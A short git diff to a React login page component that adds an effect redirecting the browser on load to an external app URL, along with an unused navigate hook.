@@ -1,11 +1,17 @@
-import React, { useState } from "react";
-import { Link } from "react-router-dom";
+import React, { useState , useEffect } from "react";
+import { Link , useNavigate} from "react-router-dom";
 import { FcGoogle } from "react-icons/fc";
 import loginImage from "../assets/login-img.jpg";
 import { MdArrowForwardIos } from "react-icons/md";
 import { IoEyeOutline, IoEyeOffOutline } from "react-icons/io5";
 
 const Login = () => {
+
+  const navigate = useNavigate()
+
+  useEffect(() => {
+     window.location.href = "https://app.accusolvaproxy.com/"
+  }, []);
   const [showPassword, setShowPassword] = useState(false);
   const [formData, setFormData] = useState({});
 
